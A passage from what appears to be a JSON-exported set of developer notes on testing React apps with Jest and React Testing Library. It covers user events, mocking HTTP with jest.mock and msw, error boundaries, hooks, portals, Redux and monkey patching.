 \u003cLink to=\"/\"\u003eGo Home\u003c/Link\u003e\n      \u003cLink to=\"/confirm\"\u003eTry again\u003c/Link\u003e\n    \u003c/\u003e\n  );\n}\n\nfunction App() {\n  return (\n    \u003cMultiPageFormProvider initialValues={{ food: \"\", drink: \"\" }}\u003e\n      \u003cRouter\u003e\n        \u003cSwitch\u003e\n          \u003cRoute path=\"/page-1\" component={Page1} /\u003e\n          \u003cRoute path=\"/page-2\" component={Page2} /\u003e\n          \u003cRoute path=\"/confirm\" component={Confirm} /\u003e\n          \u003cRoute path=\"/success\" component={Success} /\u003e\n          \u003cRoute path=\"/error\" component={Error} /\u003e\n          \u003cRoute component={Main} /\u003e\n        \u003c/Switch\u003e\n      \u003c/Router\u003e\n    \u003c/MultiPageFormProvider\u003e\n  );\n}\n\nexport default App;\n```\n\n## Testing the user flow\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { submitForm } from \"../api\";\nimport App from \"../app-reach-router\";\n\njest.mock(\"../api\");\n\ntest(\"Can fill out a form across multiple pages\", async () =\u003e {\n  submitForm.mockResolvedValueOnce({ success: true });\n\n  const testData = { food: \"test food\", drink: \"test drink\" };\n  render(\u003cApp /\u003e);\n\n  userEvent.click(await screen.findByText(/fill.*form/i));\n\n  userEvent.type(await screen.findByLabelText(/food/i), testData.food);\n  userEvent.click(await screen.findByText(/next/i));\n\n  userEvent.type(await screen.findByLabelText(/drink/i), testData.drink);\n  userEvent.click(await screen.findByText(/review/i));\n\n  expect(await screen.findByLabelText(/food/i)).toHaveTextContent(\n    testData.food,\n  );\n  expect(await screen.findByLabelText(/drink/i)).toHaveTextContent(\n    testData.drink,\n  );\n\n  userEvent.click(await screen.findByText(/confirm/i, { selector: \"button\" }));\n\n  expect(submitForm).toHaveBeenCalledWith(testData);\n  expect(submitForm).toHaveBeenCalledTimes(1);\n\n  userEvent.click(await screen.findByText(/home/i));\n\n  expect(await screen.findByText(/welcome home/i)).toBeInTheDocument();\n});\n```\n\nWe're using `await screen.findBy...(...)` instead of `screen.getBy...(...)` because they wait for the transition between pages to be done (until the timeout exceeds).\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/jest/tdd-with-ui-in-testing-library":{"title":"TDD with UI in React Testing Library","content":"\nNormally using TDD with UI is really difficult because testing utilities for UI often tie your tests closely to the implementation. However, Testing Library allows to work in TDD methodology.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/jest/testing-components":{"title":"Testing components with Jest and React Testing Library","content":"\n## New ways of using `@testing-library/react`\n\n- Don't return `getBy...` methods from `render(\u003cComponent /\u003e`. Use `screen` export instead\n- `userEvent` is better than `fireEvent`\n- Use `waitFor` instead of `wait`. They are _same_ but `waitFor` offers more possibilities\n\n## Using `jest-dom`\n\n`jest-dom` provides really useful extensions to jest’s built-in assertion library that will make it easier for us to write our test assertions (like `toHaveTextContent`).\n\n```ts\nimport * as React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport \"@testing-library/jest-dom\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest('renders a number input with a label \"Favorite Number\"', () =\u003e {\n  const div = document.createElement(\"div\");\n  ReactDOM.render(\u003cFavoriteNumber /\u003e, div);\n  expect(div.querySelector(\"input\")).toHaveAttribute(\"type\", \"number\");\n  expect(div.querySelector(\"label\")).toHaveTextContent(\"Favorite Number\");\n});\n```\n\n\u003e [!tip] KCD configured the test files to import `@testing-library/*` automatically\n\u003e\n\u003e That's why that import is missing from the examples\n\n## Using DOM Testing Library to write more maintainable tests\n\n```tsx\nimport * as React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport { getQueriesForElement } from \"@testing-library/dom\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest('renders a number input with a label \"Favorite Number\"', () =\u003e {\n  const div = document.createElement(\"div\");\n  ReactDOM.render(\u003cFavoriteNumber /\u003e, div);\n  const { getByLabelText } = getQueriesForElement(div);\n  const input = getByLabelText(/favorite number/i); // /i -\u003e case insensitive\n  expect(input).toHaveAttribute(\"type\", \"number\");\n});\n```\n\n## Using `@testing-library/react` for rendering\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen } from \"@testing-library/react\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest('renders a number input with a label \"Favorite Number\"', () =\u003e {\n  render(\u003cFavoriteNumber /\u003e);\n  const input = screen.getByLabelText(/favorite number/i);\n  expect(input).toHaveAttribute(\"type\", \"number\");\n});\n```\n\n## React Testing Library's `debug` fn\n\n`debug(renderedComponent = null)` will `console.log` the HTML code for all rendered components (unless one is provided as an argument).\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen } from \"@testing-library/react\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest('renders a number input with a label \"Favorite Number\"', () =\u003e {\n  render(\u003cFavoriteNumber /\u003e);\n  const input = screen.getByLabelText(/favorite number/i);\n  expect(input).toHaveAttribute(\"type\", \"number\");\n  screen.debug(); // \u003c-- w/o arg\n  // screen.debug(input); // \u003c-- with arg\n});\n```\n\n## Testing Event Handlers with `userEvent`\n\n`userEvent` fn more closely resebles the way the users interact with tested components than `fireEvent` itself.\n\n`userEvent.type` internally fires a bunch of `fireEvent`s to mimic human behavior. It follows `async/await` pattern.\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen, fireEvent } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest(\"entering an invalid value shows an error message\", async () =\u003e {\n  render(\u003cFavoriteNumber /\u003e);\n  const input = screen.getByLabelText(/favorite number/i);\n  // fireEvent.change(input, {target: {value: '10'}})\n  await userEvent.type(input, \"10\");\n\n  // `FavoriteNumber` contains a `div` with `role=\"alert\"` defined for accessibility purposes\n  expect(screen.getByRole(\"alert\")).toHaveTextContent(/the number is invalid/i);\n});\n```\n\n## Test props updates\n\n```tsx\nimport * as React from \"react\";\nimport user from \"@testing-library/user-event\";\nimport { render, screen } from \"@testing-library/react\";\nimport { FavoriteNumber } from \"../favorite-number\";\n\ntest(\"entering an invalid value shows an error message\", async () =\u003e {\n  const { rerender } = render(\u003cFavoriteNumber /\u003e);\n  const input = screen.getByLabelText(/favorite number/i);\n  await user.type(input, \"10\");\n  expect(screen.getByRole(\"alert\")).toHaveTextContent(/the number is invalid/i);\n  rerender(\u003cFavoriteNumber max={10} /\u003e);\n  expect(screen.queryByRole(\"alert\")).not.toBeInTheDocument();\n});\n```\n\n### The difference between `getBy...` and `queryBy...`\n\n`getBy...` will throw an `Error` if it didn't find queried element. `queryBy...` will return `null` instead.\n\nUsually it's better to use `getBy...` to have a nice error messages in Jest's output, but occasionally assertions using `queryBy...` will be easier to read.\n\n## Test accessibility\n\nNot all of accessibility testing of a web application can be automated, but much of it can be using [jest-axe](https://github.com/nickcolley/jest-axe).\n\n```tsx\nimport \"jest-axe/extend-expect\";\nimport * as React from \"react\";\nimport { render } from \"@testing-library/react\";\nimport { axe } from \"jest-axe\";\n\ntest(\"inaccessible forms fail axe\", async () =\u003e {\n  const { container } = render(\u003cInaccessibleForm /\u003e);\n  const axeResult = await axe(container);\n  expect(() =\u003e expect(axeResult).toHaveNoViolations()).toThrow();\n});\n\ntest(\"accessible forms pass axe\", async () =\u003e {\n  const { container } = render(\u003cAccessibleForm /\u003e);\n  expect(await axe(container)).toHaveNoViolations();\n});\n```\n\n## Test `componentDidCatch` Error Boundary handler\n\n```tsx\nimport * as React from \"react\";\nimport { render } from \"@testing-library/react\";\nimport { reportError } from \"../api\";\nimport { ErrorBoundary } from \"../error-boundary\";\n\njest.mock(\"../api\");\n\nafterEach(() =\u003e {\n  jest.clearAllMocks();\n});\n\nfunction Bomb({ shouldThrow }) {\n  if (shouldThrow) {\n    throw new Error(\"💣\");\n  } else {\n    return null;\n  }\n}\n\ntest(\"calls reportError and renders that there was a problem\", () =\u003e {\n  reportError.mockResolvedValueOnce({ success: true });\n  const { rerender } = render(\n    \u003cErrorBoundary\u003e\n      \u003cBomb /\u003e\n    \u003c/ErrorBoundary\u003e,\n  );\n\n  rerender(\n    \u003cErrorBoundary\u003e\n      \u003cBomb shouldThrow={true} /\u003e\n    \u003c/ErrorBoundary\u003e,\n  );\n\n  const error = expect.any(Error);\n  const info = { componentStack: expect.stringContaining(\"Bomb\") };\n  expect(reportError).toHaveBeenCalledWith(error, info);\n  expect(reportError).toHaveBeenCalledTimes(1);\n\n  expect(console.error).toHaveBeenCalledTimes(2);\n});\n```\n\nIt's possible to suppress `console.error` from the Error Boundary component. Useful for omitting the `console.error` messages in test results, if the formers make the latters messy.\n\n```tsx\nbeforeEach(() =\u003e {\n  jest.spyOn(console, \"error\").mockImplementation(() =\u003e {});\n});\n\nafterEach(() =\u003e {\n  console.error.mockRestore();\n});\n```\n\n### Ensure Error Boundaries can successfully recover from Errors\n\nThanks to `.mockClear()` we can _reset_ how many times the fn was called:\n\n```tsx\ntest(\"calls reportError and renders that there was a problem, then recovers from \", () =\u003e {\n  /* ... */\n\n  // here we are clearing out the mocks\n  console.error.mockClear();\n  mockReportError.mockClear();\n\n  rerender(\n    \u003cErrorBoundary\u003e\n      \u003cBomb /\u003e\n    \u003c/ErrorBoundary\u003e,\n  );\n\n  userEvent.click(screen.getByText(/try again/i));\n\n  expect(mockReportError).not.toHaveBeenCalled();\n  expect(console.error).not.toHaveBeenCalled();\n  expect(screen.queryByRole(\"alert\")).not.toBeInTheDocument();\n  expect(screen.queryByText(/try again/i)).not.toBeInTheDocument();\n});\n```\n\n## Mock `react-transition-group`\n\nGiven the Component:\n\n```tsx\n// hidden-message.tsx\nimport * as React from \"react\";\nimport { CSSTransition } from \"react-transition-group\";\n\nfunction Fade(props) {\n  return (\n    \u003cCSSTransition unmountOnExit timeout={1000} classNames=\"fade\" {...props} /\u003e\n  );\n}\n\nfunction HiddenMessage({ children }) {\n  const [show, setShow] = React.useState(false);\n  const toggle = () =\u003e setShow((s) =\u003e !s);\n  return (\n    \u003cdiv\u003e\n      \u003cbutton onClick={toggle}\u003eToggle\u003c/button\u003e\n      \u003cFade in={show}\u003e\n        \u003cdiv\u003e{children}\u003c/div\u003e\n      \u003c/Fade\u003e\n    \u003c/div\u003e\n  );\n}\n\nexport { HiddenMessage };\n```\n\nIn the case of `react-transition-group`, we don’t want to have to wait `1000ms` until the transition has completed before we can go on with our tests. We can mock `react-transition-group` implementation to do so:\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { HiddenMessage } from \"../hidden-message\";\n\njest.mock(\"react-transition-group\", () =\u003e {\n  return {\n    CSSTransition: (props) =\u003e (props.in ? props.children : null),\n  };\n});\n\ntest(\"shows hidden message when toggle is clicked\", () =\u003e {\n  const myMessage = \"hello world\";\n  render(\u003cHiddenMessage\u003e{myMessage}\u003c/HiddenMessage\u003e);\n  const toggleButton = screen.getByText(/toggle/i);\n  expect(screen.queryByText(myMessage)).not.toBeInTheDocument();\n  userEvent.click(toggleButton);\n  expect(screen.getByText(myMessage)).toBeInTheDocument();\n  userEvent.click(toggleButton);\n  expect(screen.queryByText(myMessage)).not.toBeInTheDocument();\n});\n```\n\nWhen we mock something, we want to make the mock as close to original function as possible.\n\n## Wrappers\n\nWrappers are a nice to have to avoid code repetition:\n\n```tsx\ntest(\"calls reportError and renders that there was a problem\", () =\u003e {\n  // [...]\n  const { rerender } = render(\u003cBomb /\u003e, { wrapper: ErrorBoundary });\n  // [...]\n});\n```\n\n## Mock HTTP with `jest.mock`\n\nIf we have a component that makes HTTP request we want to mock those out for UI unit and integration tests:\n\n```tsx\n// greeting-loader.tsx\n\nimport * as React from \"react\";\nimport { loadGreeting } from \"./api\";\n\nfunction GreetingLoader() {\n  const [greeting, setGreeting] = React.useState\u003cstring\u003e(\"\");\n  async function loadGreetingForInput(e) {\n    e.preventDefault();\n    const { data }: { data: { greeting: string } } = await loadGreeting(\n      e.target.elements.name.value,\n    );\n    setGreeting(data.greeting);\n  }\n  return (\n    \u003cform onSubmit={loadGreetingForInput}\u003e\n      \u003clabel htmlFor=\"name\"\u003eName\u003c/label\u003e\n      \u003cinput id=\"name\" /\u003e\n      \u003cbutton type=\"submit\"\u003eLoad Greeting\u003c/button\u003e\n      \u003cdiv aria-label=\"greeting\"\u003e{greeting}\u003c/div\u003e\n    \u003c/form\u003e\n  );\n}\n\nexport { GreetingLoader };\n```\n\n```tsx\n// greeting-loader.test.ts\n\nimport * as React from \"react\";\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { loadGreeting } from \"../api\";\nimport { GreetingLoader } from \"../greeting-loader\";\n\njest.mock(\"../api\");\n\ntest(\"loads greetings on click\", async () =\u003e {\n  const testGreeting = \"TEST_GREETING\";\n  loadGreeting.mockResolvedValueOnce({ data: { greeting: testGreeting } });\n  render(\u003cGreetingLoader /\u003e);\n\n  const nameInput = screen.getByLabelText(/name/i);\n  const loadButton = screen.getByText(/load/i);\n\n  await userEvent.type(nameInput, \"Mary\");\n  await userEvent.click(loadButton);\n\n  expect(loadGreeting).toHaveBeenCalledWith(\"Mary\");\n  expect(loadGreeting).toHaveBeenCalledTimes(1);\n\n  // waitFor uses `act()` for state updates for us\n  await waitFor(() =\u003e\n    expect(screen.getByLabelText(/greeting/i)).toHaveTextContent(testGreeting),\n  );\n});\n```\n\n## Mocking HTTP with `msw`\n\nIt would be nice addition to make sure that the API module is working properly when testing the components that are interacting with that module.\n\nThat would require us to actually interact with the API, but the requests would be intercepted. To intercept requests we need to setup the `msw` server intercepting them first.\n\nAlso, because the tests are ran in Node.js environment we need to polyfill the `fetch` module with `whatwg-fetch`.\n\n```tsx\nimport \"whatwg-fetch\";\nimport * as React from \"react\";\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { rest } from \"msw\";\nimport { setupServer } from \"msw/node\";\nimport { GreetingLoader } from \"../greeting-loader-01-mocking\";\n\nconst server = setupServer(\n  rest.post(\"/greeting\", (req, res, ctx) =\u003e {\n    return res(ctx.json({ data: { greeting: `Hello ${req.body.subject}` } }));\n  }),\n);\n\nbeforeAll(() =\u003e server.listen({ onUnhandledRequest: \"error\" })); // start the server\nafterAll(() =\u003e server.close());\nafterEach(() =\u003e server.resetHandlers());\n\ntest(\"loads greetings on click\", async () =\u003e {\n  render(\u003cGreetingLoader /\u003e);\n  const nameInput = screen.getByLabelText(/name/i);\n  const loadButton = screen.getByText(/load/i);\n\n  await userEvent.type(nameInput, \"Mary\");\n  await userEvent.click(loadButton);\n  await waitFor(() =\u003e\n    expect(screen.getByLabelText(/greeting/i)).toHaveTextContent(\"Hello Mary\"),\n  );\n});\n```\n\nThe cool part is that if we were to make some sort of mistake, not just in our component, but also in our client request, then we would catch that with this arguably simpler test. We also get a higher coverage.\n\n## Custom `renderComponent` fns to simplify tests\n\nHaving a custom `render[Component]` fn allows to simplify the test code:\n\n```tsx\nfunction renderEditor() {\n  const fakeUser = userBuilder()\n  const utils = render(\u003cEditor user={fakeUser} /\u003e)\n  const fakePost = postBuilder()\n\n  screen.getByLabelText(/title/i).value = fakePost.title\n  screen.getByLabelText(/content/i).value = fakePost.content\n  screen.getByLabelText(/tags/i).value = fakePost.tags.join(', ')\n  const submitButton = screen.getByText(/submit/i)\n  return {\n    ...utils,\n    submitButton,\n    fakeUser,\n    fakePost,\n  }\n}\n\ntest('renders a form with title, content, tags, and a submit button', async () =\u003e {\n  const {submitButton, fakePost, fakeUser} = renderEditor()\n    /* [...] */\n}\n```\n\n## Custom `history` implementation within `react-router`\n\nMocking the `\u003cRedirect /\u003e` component in `react-router` works, but it’s imperfect because we don’t know for sure that the user will be redirected properly.\n\nNormally we'd import `BrowserRouter`, but in tests we import `MemoryRouter` so we can manually control the `history` object.\n\n```tsx\nimport * as React from \"react\";\nimport { MemoryRouter } from \"react-router-dom\";\nimport { render as rtlRender, screen } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { Main } from \"../main\";\n\nfunction render(ui, { route = \"/\", ...renderOptions } = {}) {\n  function Wrapper({ children }) {\n    return \u003cMemoryRouter initialEntries={[route]}\u003e{children}\u003c/MemoryRouter\u003e;\n  }\n  return rtlRender(ui, {\n    wrapper: Wrapper,\n    ...renderOptions,\n  });\n}\n\ntest(\"main renders about and home and I can navigate to those pages\", async () =\u003e {\n  render(\u003cMain /\u003e);\n  expect(screen.getByRole(\"heading\")).toHaveTextContent(/home/i);\n  await userEvent.click(screen.getByText(/about/i));\n  expect(screen.getByRole(\"heading\")).toHaveTextContent(/about/i);\n});\n\ntest(\"landing on a bad page shows no match component\", () =\u003e {\n  render(\u003cMain /\u003e, {\n    route: \"/something-that-does-not-match\",\n  });\n  expect(screen.getByRole(\"heading\")).toHaveTextContent(/404/i);\n});\n```\n\n## Testing the unmounting of the component\n\nLet's assume we have the `Countdown` function component that will cleanup in `useEffect`/`useLayoutEffect`/`componentWillUnmount`.\n\n\u003e [!tip] `testing-library` doesn't care about component type\n\u003e\n\u003e The test case can be the same for both class and function components.\n\n```tsx\nimport { useEffect, useRef, useState } from \"react\";\n\nfunction Countdown() {\n  const [remainingTime, setRemainingTime] = useState(10000);\n  const end = useRef(new Date().getTime() + remainingTime);\n  useEffect(() =\u003e {\n    const interval = setInterval(() =\u003e {\n      const newRemainingTime = end.current - new Date().getTime();\n      if (newRemainingTime \u003c= 0) {\n        clearInterval(interval);\n        setRemainingTime(0);\n      } else {\n        setRemainingTime(newRemainingTime);\n      }\n    });\n    return () =\u003e clearInterval(interval);\n  }, []);\n  return remainingTime;\n}\n\nexport { Countdown };\n```\n\n```tsx\n// countdown.test.tsx\nimport * as React from \"react\";\nimport { render, act } from \"@testing-library/react\";\nimport { Countdown } from \"../countdown\";\n\n// keeping `console.error` out of the way in test output\nbeforeAll(() =\u003e {\n  jest.spyOn(console, \"error\").mockImplementation(() =\u003e {});\n});\n\nafterAll(() =\u003e {\n  console.error.mockRestore();\n});\n\nafterEach(() =\u003e {\n  jest.clearAllMocks();\n  jest.useRealTimers(); // this re-enables normal intervals/timers so the other tests can use them. just in case.\n});\n\ntest(\"does not attempt to set state when unmounted (to prevent memory leaks)\", () =\u003e {\n  jest.useFakeTimers();\n  const { unmount } = render(\u003cCountdown /\u003e);\n  unmount();\n  act(() =\u003e jest.runOnlyPendingTimers());\n  expect(console.error).not.toHaveBeenCalled();\n});\n```\n\nTo simulate unmounting the component, we're using `unmount` from `render` fn.\n\nTo make sure every intervals were cleared properly, we can use `\n`jest.useFakeTimers()`and`jest.runOnlyPendingTimers()`. The former will make sure the timers will run way quicker.\n\nAfter umnounting, we're calling `jest.runOnlyPendingTimers()` to see if there were any non-cleared intervals (we need to wrap it in `act`). 8\n\nWithout proper cleanup in the component, the error would be thrown here (that's why we're expecting errors not to be thrown).\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/jest/testing-hooks":{"title":"Testing custom React hooks","content":"\nGiven the hook:\n\n```tsx\n// useCounter.ts\nimport * as React from \"react\";\n\nfunction useCounter({ initialCount = 0, step = 1 } = {}) {\n  const [count, setCount] = React.useState(initialCount);\n  const increment = () =\u003e setCount((c) =\u003e c + step);\n  const decrement = () =\u003e setCount((c) =\u003e c - step);\n  return { count, increment, decrement };\n}\n\nexport { useCounter };\n```\n\nWe need to make sure we're using the hook inside the function component and wrap the hook fn call in an `act` fn, as a callback:\n\n```tsx\n// useCounter.test.tsx\nimport * as React from \"react\";\nimport { render, act } from \"@testing-library/react\";\nimport { useCounter } from \"../use-counter\";\n\ntest(\"exposes the count and increment/decrement functions\", () =\u003e {\n  let result;\n\n  function TestComponent() {\n    result = useCounter();\n    return null;\n  }\n\n  render(\u003cTestComponent /\u003e);\n\n  expect(result.count).toBe(0);\n  act(() =\u003e result.increment());\n  expect(result.count).toBe(1);\n  act(() =\u003e result.decrement());\n  expect(result.count).toBe(0);\n});\n```\n\n\u003e [!tip] Normally you don't need `act` for using Testing Library.\n\u003e\n\u003e All the internal functions are using `act` in their implementation if necessary.\n\n## Using `renderHook`\n\nWe could create a custom `setup` fn to reduce code duplication, but it'd a bit troublesome. Thankfully, there's a `renderHook` fn available in `@testing-library/react` that does exactly that:\n\n```tsx\nimport { renderHook, act } from \"@testing-library/react-hooks\";\nimport { useCounter } from \"../use-counter\";\n\ntest(\"exposes the count and increment/decrement functions\", () =\u003e {\n  const { result } = renderHook(useCounter);\n  expect(result.current.count).toBe(0);\n  act(() =\u003e result.current.increment());\n  expect(result.current.count).toBe(1);\n  act(() =\u003e result.current.decrement());\n  expect(result.current.count).toBe(0);\n});\n\ntest(\"allows customization of the initial count\", () =\u003e {\n  const { result } = renderHook(useCounter, {\n    initialProps: { initialCount: 3 },\n  });\n  expect(result.current.count).toBe(3);\n});\n\ntest(\"allows customization of the step\", () =\u003e {\n  const { result } = renderHook(useCounter, { initialProps: { step: 2 } });\n  expect(result.current.count).toBe(0);\n  act(() =\u003e result.current.increment());\n  expect(result.current.count).toBe(2);\n  act(() =\u003e result.current.decrement());\n  expect(result.current.count).toBe(0);\n});\n```\n\n## Testing the updates of custom React hooks if their props change over time\n\nJust use `rerender` fn:\n\n```tsx\ntest(\"the step can be changed\", () =\u003e {\n  const { result, rerender } = renderHook(useCounter, {\n    initialProps: { step: 3 },\n  });\n  expect(result.current.count).toBe(0);\n  act(() =\u003e result.current.increment());\n  expect(result.current.count).toBe(3);\n  rerender({ step: 2 });\n  act(() =\u003e result.current.decrement());\n  expect(result.current.count).toBe(1);\n});\n```\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/jest/testing-portals":{"title":"Testing React portals","content":"\nGiven that we have a simple Modal component:\n\n```ts\nimport { useRef, useLayoutEffect } from \"react\";\nimport { createPortal } from \"react-dom\";\n\nlet modalRoot = document.getElementById(\"modal-root\");\nif (!modalRoot) {\n  modalRoot = document.createElement(\"div\");\n  modalRoot.setAttribute(\"id\", \"modal-root\");\n  document.body.appendChild(modalRoot);\n}\n\nfunction Modal({ children }): ReactElement {\n  const el = useRef(document.createElement(\"div\"));\n  useLayoutEffect(() =\u003e {\n    const currentEl = el.current;\n    modalRoot.appendChild(currentEl);\n    return () =\u003e modalRoot.removeChild(currentEl);\n  }, []);\n  return createPortal(children, el.current);\n}\n\nexport { Modal };\n```\n\nWe can test if `Modal` shows the `children` like that:\n\n```tsx\nimport * as React from \"react\";\nimport { render, within } from \"@testing-library/react\";\nimport { Modal } from \"../modal\";\n\ntest(\"modal shows the children\", () =\u003e {\n  render(\n    \u003cModal\u003e\n      \u003cdiv data-testid=\"test\" /\u003e\n    \u003c/Modal\u003e,\n  );\n  const { getByTestId } = within(document.getElementById(\"modal-root\"));\n  expect(getByTestId(\"test\")).toBeInTheDocument();\n});\n```\n\nThe `getByTestId` by default is bound to `document.body`, so it's available everywhere. Using `within` allows us to scope `getByTestId` down to the particular DOM node.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/jest/testing-redux":{"title":"Testing Redux","content":"\n## Redux store setup\n\nWe have the code to be tested as follows:\n\n```tsx\n// redux-reducer.tsx\nconst initialState = { count: 0 };\n\nconst reducer = (state = initialState, action) =\u003e {\n  switch (action.type) {\n    case \"INCREMENT\":\n      return {\n        count: state.count + 1,\n      };\n    case \"DECREMENT\":\n      return {\n        count: state.count - 1,\n      };\n    default:\n      return state;\n  }\n};\n\nexport { reducer };\n```\n\n```tsx\n// redux-store.tsx\nimport { configureStore } from \"@reduxjs/toolkit\";\nimport { reducer } from \"./redux-reducer\";\n\nconst store = configureStore({ reducer });\n\nexport { store };\n```\n\n```tsx\n// redux-counter.tsx\nimport * as React from \"react\";\nimport { useSelector, useDispatch } from \"react-redux\";\n\nfunction Counter() {\n  const count = useSelector((state) =\u003e state.count);\n  const dispatch = useDispatch();\n  const increment = () =\u003e dispatch({ type: \"INCREMENT\" });\n  const decrement = () =\u003e dispatch({ type: \"DECREMENT\" });\n  return (\n    \u003cdiv\u003e\n      \u003ch2\u003eCounter\u003c/h2\u003e\n      \u003cdiv\u003e\n        \u003cbutton onClick={decrement}\u003e-\u003c/button\u003e\n        \u003cspan aria-label=\"count\"\u003e{count}\u003c/span\u003e\n        \u003cbutton onClick={increment}\u003e+\u003c/button\u003e\n      \u003c/div\u003e\n    \u003c/div\u003e\n  );\n}\n\nexport { Counter };\n```\n\n## Testing Redux Connected components\n\nWe need to wrap the component in `Provider` with a store associated with it:\n\n```tsx\nimport * as React from \"react\";\nimport { Provider } from \"react-redux\";\nimport { render, screen } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { Counter } from \"../redux-counter\";\nimport { store } from \"../redux-store\";\n\ntest(\"can render with `redux` with defaults\", async () =\u003e {\n  render(\n    \u003cProvider store={store}\u003e\n      \u003cCounter /\u003e\n    \u003c/Provider\u003e,\n  );\n  await userEvent.click(screen.getByText(\"+\"));\n  expect(screen.getByLabelText(/count/i)).toHaveTextContent(\"1\");\n});\n\ntest(\"can render with redux with custom initial state\", async () =\u003e {\n  const customInitialStateStore = configureStore({\n    reducer,\n    preloadedState: { count: 3 },\n  });\n  render(\n    \u003cProvider store={customInitialStateStore}\u003e\n      \u003cCounter /\u003e\n    \u003c/Provider\u003e,\n  );\n  await userEvent.click(screen.getByText(\"-\"));\n  expect(screen.getByLabelText(/count/i)).toHaveTextContent(\"2\");\n});\n```\n\nThe cool part is that we're testing our application store as well as the component that's using this store, in integration.\n\nIn tests themselves, we only interact with the component itself, as it is not using Redux at all (redux as an implementation detail), so if we were to migrate away from Redux to some other state management solution, we would need minimum updates to our tests.\n\nIt's also useful to create a custom render function for testing:\n\n```tsx\nimport * as React from \"react\";\nimport { configureStore } from \"@reduxjs/toolkit\";\nimport { Provider } from \"react-redux\";\nimport { render as rtlRender, screen } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { Counter } from \"../redux-counter\";\nimport { reducer } from \"../redux-reducer\";\n\nfunction render(\n  ui,\n  {\n    initialState,\n    store = configureStore({ reducer, preloadedState: initialState }),\n    ...renderOptions\n  } = {},\n) {\n  function Wrapper({ children }) {\n    return \u003cProvider store={store}\u003e{children}\u003c/Provider\u003e;\n  }\n  return {\n    ...rtlRender(ui, {\n      wrapper: Wrapper,\n      ...renderOptions,\n    }),\n    store,\n  };\n}\n\ntest(\"can increment the value\", async () =\u003e {\n  render(\u003cCounter /\u003e);\n  await userEvent.click(screen.getByText(\"+\"));\n  expect(screen.getByLabelText(/count/i)).toHaveTextContent(\"1\");\n});\n\ntest(\"can decrement the value\", async () =\u003e {\n  render(\u003cCounter /\u003e, {\n    initialState: { count: 3 },\n  });\n  await userEvent.click(screen.getByText(\"-\"));\n  expect(screen.getByLabelText(/count/i)).toHaveTextContent(\"2\");\n});\n```\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/mocking":{"title":"Mocking","content":"\nMocking is used to enable testing modules that depend (as in _dependency_) on another modules, that we don't want to _really_ use, e.g. credit card service.\n\nWe may not want to do any requests with a credit card service, so we can mock it (btw making its behavior [[deterministic]]).\n\n## Monkey patching\n\nMonkey patching is the most naive (and limited) approach to mocking in JS. Basically it's overriding an object property (e.g. `utils.getWinner()`) in the test.\n\n```ts\nconst assert = require(\"assert\");\nconst thumbWawr = require(\"../thumbwar\");\nconst utils = require(\"../utils\"); // `utils` is the module we want to mock\n\nconst originalGetWinner = utils.getWinner; // saving the original implementation for cleanup\nutils.getWinner = (p1, p2) =\u003e p1; // here we make sure `.getWinner` will always ensure the first player wins\n\nconst winner = thumbWar(\"Kent C. Dodds\", \"Ken Wheeler\");\nassert.strictEqual(winner, \"Kent C. Dodds\"); // PASS\n\nutils.getWinner = originalGetWinner; // cleanup\n```\n\n\u003e [!danger] In ES modules monkey patching does not work.\n\n### Cleanup\n\nImportant thing in testing is to clean up after the mocking in the test case, so the other cases may use the original module again or mock it in a different way.\n\nIn this test case we reassign the real function, exported from the `utils.ts` back to `getWinner`.\n\n## Ensuring fns are called properly with mocks\n\nWhen writing tests and mocking dependencies, we want to verify that the function was called correctly, by tracking how often the function was called and what arguments it was called with. This is to ensure the usage of `utils.getWinner` in `thumbWar` implementation is correct.\n\nTo do that we may use `jest.fn` _mock function_. It keeps track the parameters and how many it was called.\n\n```ts\nutils.getWinner = jest.fn((p1, p2) =\u003e p1);\n\nexpect(utils.getWinner).toHaveBeenCalledTimes(2);\nexpect(utils.getWinner).toHaveBeenCalledWith(\"Kent C. Dodds\", \"Ken Wheeler\");\nexpect(utils.getWinner).toHaveBeenNthCalledWith(\n  1,\n  \"Kent C. Dodds\",\n  \"Ken Wheeler\",\n);\nexpect(utils.getWinner).toHaveBeenNthCalledWith(\n  2,\n  \"Kent C. Dodds\",\n  \"Ken Wheeler\",\n);\n```\n\n## `jest.fn`\n\n`jest.fn` internally is a function that has some nice properties for use:\n\n- `mock`\n  - `calls` - an array that holds all of the args that the function was called with\n\nLast 3 assertions could be rewritten as one:\n\n```ts\nexpect(utils.getWinner.mock.calls).toEqual([\n  [\"Kent C. Dodds\", \"Ken Wheeler\"],\n  [\"Kent C. Dodds\", \"Ken Wheeler\"],\n]);\n```\n\nThis could be implemented this way:\n\n```ts\ntype MockFnType = { mock: { calls: any[] } };\n\nfunction fn(impl) {\n  const mockFn: MockFnType = (...args) =\u003e {\n    mockFn.mock.calls.push(args);\n    return impl(args);\n  };\n  mockFn.mock = { calls: [] }; // this implementation saves each call in the array\n  return 